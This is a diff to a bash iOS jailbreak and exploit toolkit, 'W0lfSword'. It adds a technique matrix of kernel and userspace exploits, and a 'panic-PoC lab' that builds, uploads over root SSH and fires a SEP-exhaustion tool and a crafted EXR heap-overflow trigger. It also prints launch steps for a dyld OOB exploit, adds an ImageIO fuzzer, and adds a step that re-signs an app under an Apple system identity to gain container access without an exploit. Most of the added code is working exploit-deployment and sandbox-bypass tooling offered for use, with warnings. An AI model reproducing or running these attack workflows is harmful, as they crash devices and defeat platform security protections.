@@ -631,6 +631,240 @@ cmd_targets() {
     printf "  ${C_FROST}%-14s${NC} %s\n" "installd"     "IPA sideloading"
     printf "  ${C_FROST}%-14s${NC} %s\n" "Standalone"   "No-jailbreak .ipa"
     echo ""
+    section "Research Exploits (referenceforAI/moreprojects)"
+    printf "  ${C_FROST}%-22s${NC} %-16s ${C_GRN}%s${NC}\n"            "DarkSword pe_v1/pe_v2" "17.0–26.0.1" "implemented"
+    printf "  ${C_FROST}%-22s${NC} %-16s ${C_AMB}%s${NC} (K1.6)\n"     "kfd PUAF"              "16.x"        "port pending"
+    printf "  ${C_FROST}%-22s${NC} %-16s ${C_AMB}%s${NC}\n"            "checkm8 (usbliter8)"   "15.6–27.0b"  "menu 9"
+    printf "  ${C_FROST}%-22s${NC} %-16s ${C_AMB}%s${NC} (CVE-2026-20687)\n" "AppleJPEGDriver UAF" "26.3 (A19)" "panic PoC"
+    printf "  ${C_FROST}%-22s${NC} %-16s ${C_AMB}%s${NC} (CVE-2026-43724)\n" "dyld slide OOB"      "26.x?"       "LPE/panic"
+    printf "  ${C_FROST}%-22s${NC} %-16s ${C_AMB}%s${NC} (CVE-2026-28990)\n" "EXR ImageIO overflow" "≤26.4.2"    "crash PoC"
+    printf "  ${C_FROST}%-22s${NC} %-16s ${C_AMB}%s${NC}\n"            "SEP exhaustion"        "26.1–26.2"   "DoS PoC"
+    echo -e "  ${C_DIM}Details: research/moreprojects_deep_dive.md${NC}"
+    echo ""
+}
+
+# ═══════════════════════════════════════════════════════════════
+#  EXPLOITS — technique matrix (K1.5)
+# ═══════════════════════════════════════════════════════════════
+
+cmd_exploits() {
+    show_header
+    echo ""
+    section "Exploit Technique Matrix"
+    printf "  ${C_FROST}%-24s${NC} %-12s %-10s %-24s %s\n" "Technique" "iOS range" "SoC" "Bug class" "Status"
+    printf "  ${C_DIM}%s${NC}\n" "$(repeat_char '─' 82)"
+    printf "  ${C_FROST}%-24s${NC} %-12s %-10s %-24s ${C_GRN}%s${NC}\n" "DarkSword pe_v1"      "17.0–26.0.1" "A12–A17" "ICMPv6 spray + IOSurface OOB" "implemented"
+    printf "  ${C_FROST}%-24s${NC} %-12s %-10s %-24s ${C_GRN}%s${NC}\n" "DarkSword pe_v2"      "17.0–26.0.1" "A18"     "same, A18 alloc path"          "implemented"
+    printf "  ${C_FROST}%-24s${NC} %-12s %-10s %-24s ${C_AMB}%s${NC} (K1.6)\n" "kfd PhysPuppet" "16.x" "A10+" "PUAF — physical UAF" "planned"
+    printf "  ${C_FROST}%-24s${NC} %-12s %-10s %-24s ${C_AMB}%s${NC} (K1.6)\n" "kfd Smith"        "16.x" "A10+" "PUAF — physical race" "planned"
+    printf "  ${C_FROST}%-24s${NC} %-12s %-10s %-24s ${C_AMB}%s${NC} (K1.6)\n" "kfd Landa"        "16.x" "A10+" "PUAF — IOSurface race" "planned"
+    printf "  ${C_FROST}%-24s${NC} %-12s %-10s %-24s ${C_AMB}%s${NC}\n" "checkm8 (usbliter8)" "15.6–27.0b" "A7–A11" "SecureROM USB bootchain" "menu 9"
+    printf "  ${C_FROST}%-24s${NC} %-12s %-10s %-24s ${C_AMB}%s${NC} (CVE-2026-20687)\n" "AppleJPEGDriver UAF" "26.3" "A19" "kernel UAF → MTE panic" "research"
+    printf "  ${C_FROST}%-24s${NC} %-12s %-10s %-24s ${C_AMB}%s${NC} (CVE-2026-43724)\n" "dyld slide OOB" "26.x?" "arm64e" "v5 slide-walk OOB R/W" "research"
+    printf "  ${C_FROST}%-24s${NC} %-12s %-10s %-24s ${C_AMB}%s${NC} (CVE-2026-28990)\n" "EXR ImageIO overflow" "≤26.4.2" "all" "int overflow → heap overflow" "research"
+    printf "  ${C_FROST}%-24s${NC} %-12s %-10s %-24s ${C_AMB}%s${NC}\n" "SEP exhaustion" "26.1–26.2" "A13–A19" "AppleKeyStore → SEP panic" "research"
+    echo ""
+    echo -e "  ${C_DIM}green = deployable today · yellow = in progress · research = reference PoC in${NC}"
+    echo -e "  ${C_DIM}referenceforAI/moreprojects (deep dive: research/moreprojects_deep_dive.md)${NC}"
+    echo -e "  ${C_DIM}Panic-PoC catalog: ${C_FROST}./W0lfSword poc list${NC}"
+    echo ""
+}
+
+# ═══════════════════════════════════════════════════════════════
+#  POC — panic-PoC lab (research only — crashes the device)
+# ═══════════════════════════════════════════════════════════════
+
+POC_DIR="$PROJECT_DIR/pocs"
+
+poc_require_device() {
+    local ip; ip=$(get_device_ip "${1:-}")
+    if [ -z "$ip" ]; then
+        err "No device IP — pass it or use 'device add'" >&2
+        hint "Connect the phone via USB, or: ./W0lfSword device add 192.168.x.x" >&2
+        return 1
+    fi
+    if ! ssh_safe "root@$ip" "echo ok" 2>/dev/null | grep -q ok; then
+        err "SSH failed to root@$ip — device offline or OpenSSH not installed" >&2
+        return 1
+    fi
+    echo "$ip"
+}
+
+poc_warn() {
+    disclaimer <<EOF
+RESEARCH ONLY — these PoCs crash the device BY DESIGN:
+  • sep-panic   — SEP firmware panic (AppleKeyStore ×41) → device reboots
+  • exr         — ImageIO heap overflow (CVE-2026-28990) → decode process dies
+  • applejpeg   — kernel UAF (CVE-2026-20687) → MTE kernel panic → reboot
+  • dirtyslide  — dyld slide OOB (CVE-2026-43724) → kernel panic → reboot
+A panic costs you a reboot, never data loss — but do NOT run these on a
+phone you can't afford to reboot. The crash-monitor logs what happens.
+EOF
+}
+
+poc_list() {
+    show_header
+    echo ""
+    section "Panic-PoC Catalog (research only)"
+    printf "  ${C_FROST}%-12s${NC} %-26s %-14s %s\n" "id" "Effect" "iOS target" "Runs from"
+    printf "  ${C_DIM}%s${NC}\n" "$(repeat_char '─' 80)"
+    printf "  ${C_FROST}%-12s${NC} %-26s %-14s ${C_GRN}%s${NC}\n" "sep-panic"   "SEP panic (deterministic reboot)" "26.1–26.2" "this script (Theos)"
+    printf "  ${C_FROST}%-12s${NC} %-26s %-14s ${C_GRN}%s${NC}\n" "exr"         "ImageIO heap overflow (userspace)" "≤26.4.2"    "this script (python3)"
+    printf "  ${C_FROST}%-12s${NC} %-26s %-14s ${C_AMB}%s${NC}\n" "applejpeg"   "AppleJPEGDriver UAF → kernel panic" "26.3 (A19)" "macOS + Xcode only"
+    printf "  ${C_FROST}%-12s${NC} %-26s %-14s ${C_AMB}%s${NC}\n" "dirtyslide"  "dyld slide OOB → kernel panic"      "26.x?"      "macOS + Xcode only"
+    echo ""
+    echo -e "  ${C_DIM}Usage: ${C_FROST}./W0lfSword poc <id> [ip]${NC} — every run is gated behind a${NC}"
+    echo -e "  ${C_DIM}confirmation prompt and arms the crash-monitor.${NC}"
+    echo ""
+}
+
+poc_xcode_only() {
+    local name="$1" cve="$2"
+    if [ "$IS_MACOS" -ne 1 ]; then
+        err "$name ($cve) is an Xcode project — cannot build on Linux"
+        hint "Use: poc sep-panic or poc exr (both work from any OS)"
+        return 1
+    fi
+    command -v xcodebuild &>/dev/null || { err "xcodebuild not found — install Xcode + Command Line Tools first"; return 1; }
+    warn "$name is not auto-deployed — manual Xcode flow only"
+    case "$name" in
+        applejpeg)
+            echo -e "  ${C_DIM}  1. open referenceforAI/moreprojects/CVE-2026-20687-AppleJPEGDriver-UAF/ios-app/Test.xcodeproj${NC}"
+            echo -e "  ${C_DIM}  2. build to a real device, tap Panic, then open the Camera app${NC}"
+            echo -e "  ${C_DIM}  3. deferred MTE panic — collect the .ips from Settings → Privacy → Analytics${NC}"
+            ;;
+        dirtyslide)
+            echo -e "  ${C_DIM}  1. open referenceforAI/moreprojects/DirtySlide/DirtySlide.xcodeproj${NC}"
+            echo -e "  ${C_DIM}  2. launch with: xcrun devicectl device process launch --console --no-activate \\${NC}"
+            echo -e "  ${C_DIM}     -e '{\"_SafeMode\":\"1\",\"DYLD_SHARED_CACHE_DIR\":\"/a\"}' com.ios.DirtySlide${NC}"
+            echo -e "  ${C_DIM}  3. kernel panics (dyld slide OOB); retry after ~3 min if it doesn't${NC}"
+            ;;
+    esac
+    return 1
+}
+
+poc_sep_panic() {
+    local ip; ip=$(poc_require_device "$1") || return 1
+    poc_warn
+    confirm "This WILL panic the SEP and reboot the phone. Continue?" || { err "Aborted"; return 1; }
+
+    stage "1/3" "Building sep_panic tool (Theos)..."
+    check_theos || { err "THEOS not set — run: sudo ./W0lfSword setup"; hint "The tool builds on this computer with the same toolchain as the tweak."; return 1; }
+    local build_log; build_log=$(cd "$POC_DIR/sep_panic" && make 2>&1)
+    local ec=$?
+    $VERBOSE && echo "$build_log" | tail -8
+    if [ $ec -ne 0 ]; then
+        err "sep_panic build failed (exit=$ec)"
+        hint "Run './W0lfSword doctor' — it's almost always THEOS or the SDK."
+        return 1
+    fi
+    local bin; bin=$(find "$POC_DIR/sep_panic/.theos" -type f -name sep_panic 2>/dev/null | head -1)
+    [ -n "$bin" ] || { err "Built binary not found — check .theos output"; return 1; }
+    ok "Built $(basename "$bin") ($(du -h "$bin" | cut -f1))"
+
+    stage "2/3" "Uploading to root@$ip..."
+    retry 3 1 "scp_safe '$bin' 'root@$ip:/tmp/sep_panic'" || { err "SCP failed after 3 retries"; return 1; }
+
+    stage "3/3" "Arming crash-monitor + firing..."
+    crash_monitor "$ip" "$DATA_DIR/poc_sep_panic.log"
+    echo -e "  ${C_AMB}${B}Firing — the SSH session drops when the SEP panics (~call 41).${NC}"
+    ssh_safe "root@$ip" "chmod +x /tmp/sep_panic && /tmp/sep_panic" 2>/dev/null || true
+    echo ""
+    echo -e "  ${C_GRN}${B}PoC fired.${NC} The phone should now reboot itself."
+    echo -e "  ${C_DIM}Expected panic: 'SEP Panic: :sks /sks : 0x0006fea7' (fixed address, no SEP ASLR).${NC}"
+    echo -e "  ${C_DIM}Check the run: ${C_FROST}./W0lfSword crashlog${NC} — look for 'CONNECTION LOST', then verify the reboot.${NC}"
+    echo ""
+}
+
+poc_exr() {
+    local ip; ip=$(poc_require_device "$1") || return 1
+    poc_warn
+    confirm "This will crash the decode process (device survives). Continue?" || { err "Aborted"; return 1; }
+
+    stage "1/3" "Generating crafted EXR (CVE-2026-28990)..."
+    local exr="$DATA_DIR/zygosec_poc.exr"
+    python3 "$POC_DIR/exr/gen_exr_trigger.py" "$exr" >/dev/null || { err "EXR generation failed (python3?)"; return 1; }
+    ok "Trigger written ($(du -h "$exr" | cut -f1))"
+
+    stage "2/3" "Uploading to root@$ip..."
+    retry 3 1 "scp_safe '$exr' 'root@$ip:/var/tmp/zygosec_poc.exr'" || { err "SCP failed after 3 retries"; return 1; }
+
+    stage "3/3" "Opening trigger on the phone..."
+    if ssh_safe "root@$ip" "command -v uiopen" 2>/dev/null | grep -q uiopen; then
+        ssh_safe "root@$ip" "uiopen file:///var/tmp/zygosec_poc.exr" 2>/dev/null || true
+        echo -e "  ${C_DIM}uiopen found — QuickLook is decoding the EXR now.${NC}"
+    else
+        ssh_safe "root@$ip" "chown mobile:mobile /var/tmp/zygosec_poc.exr && mv /var/tmp/zygosec_poc.exr /var/mobile/Documents/zygosec_poc.exr" 2>/dev/null || true
+        echo -e "  ${C_DIM}No uiopen — file staged at ${C_FROST}/var/mobile/Documents/zygosec_poc.exr${NC}"
+    fi
+    echo ""
+    echo -e "  ${C_GRN}${B}Trigger deployed.${NC} Next step on the phone:"
+    echo -e "  ${C_DIM}1. Open the file in Filza's image viewer (or Files → On My iPhone → zygosec_poc.exr)${NC}"
+    echo -e "  ${C_DIM}2. ImageIO EXR decode → heap overflow in the decode thread (EXC_GUARD, 0x4141...)${NC}"
+    echo -e "  ${C_DIM}3. The device SURVIVES — userspace crash. Logs: ${C_FROST}./W0lfSword log 50${NC}"
+    echo ""
+}
+
+cmd_poc() {
+    local sub="${1:-list}"
+    case "$sub" in
+        list|"") poc_list;;
+        sep-panic|seppanic) poc_sep_panic "${2:-}";;
+        exr) poc_exr "${2:-}";;
+        applejpeg|apple-jpeg) poc_xcode_only "applejpeg" "CVE-2026-20687";;
+        dirtyslide|dirty-slide) poc_xcode_only "dirtyslide" "CVE-2026-43724";;
+        --help|-h|help) poc_list;;
+        *) err "Unknown poc: $sub"; hint "Usage: poc list | poc sep-panic [ip] | poc exr [ip]"; return 1;;
+    esac
+}
+
+# ═══════════════════════════════════════════════════════════════
+#  FUZZ — ImageIO fuzzing harness (K4.2)
+# ═══════════════════════════════════════════════════════════════
+
+cmd_fuzz() {
+    local script="$PROJECT_DIR/research/imageio_fuzz.sh"
+    if [ ! -f "$script" ]; then
+        err "imageio_fuzz.sh missing"
+        hint "Expected at research/imageio_fuzz.sh — re-clone or restore the repo."
+        return 1
+    fi
+    "$script" "$@"
+}
+
+# ═══════════════════════════════════════════════════════════════
+#  MHA — MobileHouseArrest re-sign (K4.12)
+# ═══════════════════════════════════════════════════════════════
+
+cmd_mha() {
+    local ipa="${1:-}" out="${2:-Filza-MHA.ipa}"
+    disclaimer <<EOF
+What this does: builds the tweak, then re-signs a Filza IPA with the
+com.apple.mobile.MobileHouseArrest identity and injects the tweak dylib.
+containermanagerd trusts that identity, so container leases activate
+WITHOUT a kernel exploit (works iOS 18-27b, per FilzaSlop).
+Requires ldid on this computer + a Filza .ipa. Research tool for the
+userspace path (K4.12) — the resulting IPA is for testing, not shipping.
+EOF
+    [ -n "$ipa" ] || { err "Usage: mha <Filza.ipa> [out.ipa]"; hint "Example: ./W0lfSword mha Filza.ipa Filza-MHA.ipa"; return 1; }
+    [ -f "$ipa" ] || { err "IPA not found: $ipa"; return 1; }
+    command -v ldid &>/dev/null || { err "ldid not installed"; hint "Install: sudo apt install ldid (Linux) / brew install ldid (macOS)"; return 1; }
+
+    stage "1/2" "Building tweak (MHA_IDENTITY=1)..."
+    check_theos || { err "THEOS not set — run: sudo ./W0lfSword setup"; return 1; }
+    local build_log; build_log=$(make package MHA_IDENTITY=1 2>&1)
+    local ec=$?
+    $VERBOSE && echo "$build_log" | tail -5
+    if [ $ec -ne 0 ]; then
+        err "Build failed (exit=$ec)"
+        return 1
+    fi
+    local dylib; dylib=$(ls .theos/obj/debug/arm64/FilzaApplySandboxExt.dylib 2>/dev/null || ls .theos/obj/arm64/FilzaApplySandboxExt.dylib 2>/dev/null || echo "")
+    [ -n "$dylib" ] || { err "Built dylib not found in .theos"; return 1; }
+    ok "Built tweak dylib"
+
+    stage "2/2" "Re-signing $ipa as com.apple.mobile.MobileHouseArrest..."
+    bash "$PROJECT_DIR/scripts/re-sign_mha.sh" "$ipa" "$dylib" "$out"
 }
 
 cmd_clean() {
@@ -1209,14 +1443,19 @@ draw_menu() {
 
     menu_group "diagnostics & power"
     menu_opt 7 "Diagnostics"      "doctor · audit · status"
-    menu_opt 8 "Targets"          "supported apps & planned exploits"
+    menu_opt 8 "Targets & Exploits" "supported apps · technique matrix"
     menu_opt 9 "usbliter8-arctic" "A12/A13 tethered jailbreak · PWN DFU · CFW builder" "${C_AMB}[root]${NC}"
+    echo ""
+
+    menu_group "research (device-crashing PoCs)"
+    menu_opt 0 "Panic-PoC Lab"    "sep-panic / exr / applejpeg / dirtyslide" "${C_RED}[crashes phone]${NC}"
+    menu_opt f "ImageIO Fuzzer"   "mutate DNG/HEIF → phone → crash capture (K4.2)"
     echo ""
 
     echo -e "  ${C_GREY}── shortcuts ──────────────────────────────────────────────────────${NC}"
     printf "  ${C_FROST}b${NC} build  ${C_FROST}d${NC} deploy  ${C_FROST}a${NC} adderall  ${C_FROST}sf${NC} safe  ${C_FROST}s${NC} status  ${C_FROST}l${NC} log\n"
-    printf "  ${C_FROST}m${NC} monitor  ${C_FROST}c${NC} clean  ${C_FROST}x${NC} explain  ${C_FROST}tw${NC} tweaks  ${C_FROST}q${NC} quit\n"
-    echo -e "  ${C_DIM}  ${C_AMB}[root]${C_DIM} = needs sudo (adderall, setup, usbliter8) · everything else works without${NC}"
+    printf "  ${C_FROST}m${NC} monitor  ${C_FROST}c${NC} clean  ${C_FROST}x${NC} explain  ${C_FROST}tw${NC} tweaks  ${C_FROST}e${NC} exploits  ${C_FROST}f${NC} fuzz  ${C_FROST}poc${NC} panic-lab  ${C_FROST}q${NC} quit\n"
+    echo -e "  ${C_DIM}  ${C_AMB}[root]${C_DIM} = needs sudo (adderall, setup, usbliter8) · ${C_RED}[crashes phone]${C_DIM} = research PoCs, device reboots${NC}"
     echo ""
     echo -ne "  ${C_FROST}${B}W0lfSword ▸${NC} "
 }
@@ -1300,8 +1539,11 @@ run_menu() {
                echo ""; cmd_profile $pcmd || true;;
             6) { cmd_history stats; echo ""; cmd_history show; } || true;;
             7) { cmd_doctor; echo ""; cmd_audit; echo ""; cmd_status; } || true;;
-            8) cmd_targets || true;;
+            8) { cmd_targets || true; echo ""; cmd_exploits || true; };;
             tweaks|tw)    cmd_tweaks || true;;
+            0|poc|panic)  cmd_poc || true;;
+            f|fuzz)       cmd_fuzz || true;;
+            exploits|e)   cmd_exploits || true;;
             # usbliter8-arctic
             9|ul8|usbliter8)
                 if [ "$EUID" -ne 0 ]; then
@@ -1332,7 +1574,7 @@ run_menu() {
             help|h|\?) cmd_help || true;;
             explain|x) cmd_explain || true;;
             *)
-                echo -e "  ${C_RED}Unknown — try 1-9, b/d/a/sf/s/l/m/c/x/tw, or q${NC}";;
+                echo -e "  ${C_RED}Unknown — try 1-9, b/d/a/sf/s/l/m/c/x/tw/e/poc, or q${NC}";;
         esac
         echo ""; echo -ne "  ${C_DIM}── Press enter to continue ──${NC}"; read -r || true; echo ""
     done
@@ -2288,6 +2530,67 @@ tweaks — the tweak catalog + installer.
   A10-A11 → PUAF fallback (pending port), anything else refuses cleanly.
 EOF
             ;;
+        exploits)
+            cat <<'EOF'
+exploits — the technique matrix (K1.5).
+  One table of every exploit path this project knows about: DarkSword
+  pe_v1/pe_v2 (implemented), kfd PUAF variants (planned, K1.6), checkm8
+  via usbliter8 (menu 9), and the research PoCs from
+  referenceforAI/moreprojects: AppleJPEGDriver UAF (CVE-2026-20687),
+  dyld slide (CVE-2026-43724), EXR ImageIO (CVE-2026-28990), SEP
+  exhaustion. Each row: iOS range, SoC, bug class, status.
+EOF
+            ;;
+        poc)
+            cat <<'EOF'
+poc — the panic-PoC lab (RESEARCH ONLY — crashes the device).
+  'poc list' — catalog of PoCs with iOS targets.
+  'poc sep-panic [ip]' — builds the AppleKeyStore exhaustion tool with
+      Theos, uploads it, and fires it: ~41 calls → deterministic SEP
+      firmware panic → device reboots. Crash-monitor armed first.
+  'poc exr [ip]' — generates the crafted EXR (CVE-2026-28990, ImageIO
+      heap overflow, alive ≤26.4.2), uploads it, opens it via uiopen or
+      stages it for Filza. USERSpace crash — device survives.
+  'poc applejpeg' / 'poc dirtyslide' — Xcode projects, macOS-only,
+      prints the manual build + launch steps.
+  Every run is gated behind a confirmation prompt. A panic = reboot,
+  not data loss, but don't use these on a phone you can't reboot.
+EOF
+            ;;
+        fuzz)
+            cat <<'EOF'
+fuzz — the ImageIO fuzzing harness (K4.2).
+  Full pipeline (no args): prepare → push → run → collect → report.
+  prepare  — research/imageio_mutate.py mutates DNG/HEIF/TIFF/JPEG seeds
+             (DNG: SamplesPerPixel / SOF3 / dims; JPEG-AppleJPEG: SOF/DQT/
+             DHT/SOS/EXIF/scan — K4.8 CVE-2025-43539 class) into
+             .w0lfsword/fuzz/corpus/ with an attributable TSV manifest.
+  push     — uploads the corpus to /var/mobile/Documents/.fuzz_corpus.
+  run      — opens each sample via uiopen/QuickLook (or stage for Filza),
+             snapshots CrashReporter before/after each open to attribute
+             crashes to the exact sample.
+  collect  — pulls /tmp/FilzaTweak.log + fresh .ips crash reports.
+  report   — dedupes crash signatures, flags UNIQUE (1x) ones, and
+             lists sample→crash attribution.
+  Options: --device <ip> --count <N> --strategy dng|generic|all
+           --seeds <dir> --wait <sec> --yes
+  CVE-2025-43300 (patched 18.6.2) and CVE-2026-28990 (patched 26.5)
+  are the reference targets; 26.1–26.4.x is the live window.
+EOF
+            ;;
+        mha)
+            cat <<'EOF'
+mha — MobileHouseArrest re-sign (K4.12).
+  Builds the tweak with -DMHA_IDENTITY, then re-signs a Filza IPA so its
+  bundle + CodeDirectory identifier is com.apple.mobile.MobileHouseArrest
+  (scripts/re-sign_mha.sh, ldid + add-load-dylib.py). containermanagerd
+  trusts that identity and grants container leases WITHOUT any kernel
+  exploit — pre-exploit container access on iOS 18–27b (FilzaSlop trick).
+  After install, the tweak logs '[MCM] *** CONTAINER ACCESS ACTIVE' in
+  /tmp/FilzaTweak.log. Research tool — the IPA is for testing.
+  Usage: ./W0lfSword mha <Filza.ipa> [out.ipa]   (needs ldid)
+EOF
+            ;;
         help)
             cat <<'EOF'
 W0lfSword — iOS kernel exploit toolkit, one script.
@@ -2308,7 +2611,8 @@ EOF
 explain — plain-English explanations of commands.
 Usage: ./W0lfSword explain <command>   (e.g. explain adderall)
 Available: adderall, build, deploy, quick, safe, toggle, setup,
-           doctor, status, monitor, log, reboot, offsets, help
+           doctor, status, monitor, log, reboot, offsets, tweaks,
+           exploits, poc, fuzz, usbliter8, help
 EOF
             ;;
     esac
@@ -2363,8 +2667,18 @@ cmd_help() {
     printf "  ${C_EYE}%-14s${NC} %s\n" "audit"        "Static analysis + brace check"
     printf "  ${C_EYE}%-14s${NC} %s\n" "doctor"       "Check environment"
     printf "  ${C_EYE}%-14s${NC} %s\n" "offsets"      "iOS version coverage"
+    printf "  ${C_EYE}%-14s${NC} %s\n" "exploits (e)" "Exploit technique matrix (K1.5)"
     printf "  ${C_EYE}%-14s${NC} %s\n" "toggle on|off" "Enable/disable tweak"
     printf "  ${C_EYE}%-14s${NC} %s\n" "history"      "Exploit stats + chart"
+    echo ""
+    section "Research (device-crashing PoCs — use at your own risk)"
+    printf "  ${C_EYE}%-14s${NC} %s\n" "poc list"     "Panic-PoC catalog"
+    printf "  ${C_EYE}%-14s${NC} %s\n" "poc sep-panic [ip]" "SEP firmware panic (AppleKeyStore) — builds + deploys + fires"
+    printf "  ${C_EYE}%-14s${NC} %s\n" "poc exr [ip]" "EXR ImageIO heap overflow trigger (CVE-2026-28990)"
+    printf "  ${C_EYE}%-14s${NC} %s\n" "poc applejpeg" "AppleJPEGDriver UAF — macOS/Xcode only (CVE-2026-20687)"
+    printf "  ${C_EYE}%-14s${NC} %s\n" "poc dirtyslide" "dyld slide OOB — macOS/Xcode only (CVE-2026-43724)"
+    printf "  ${C_EYE}%-14s${NC} %s\n" "fuzz (f)"      "ImageIO fuzz harness: mutate → push → open → crash capture (K4.2)"
+    printf "  ${C_EYE}%-14s${NC} %s\n" "mha <ipa>"    "Re-sign Filza as MobileHouseArrest → pre-exploit container access (K4.12)"
     echo ""
     section "Exploit Workflow"
     printf "  ${C_EYE}%-14s${NC} %s\n" "adderall (a)" "Auto-discover → build → deploy → verify${C_AMB} [root]${NC}"
@@ -2425,6 +2739,10 @@ main() {
         toggle)    cmd_toggle "${args[@]}";;
         offsets)   cmd_offsets "${args[@]}";;
         targets)   cmd_targets "${args[@]}";;
+        exploits)  cmd_exploits "${args[@]}";;
+        poc)       cmd_poc "${args[@]}";;
+        fuzz)      cmd_fuzz "${args[@]}";;
+        mha)       cmd_mha "${args[@]}";;
         tweaks)    cmd_tweaks "${args[@]}";;
         clean)     cmd_clean "${args[@]}";;
         doctor)    cmd_doctor "${args[@]}";;
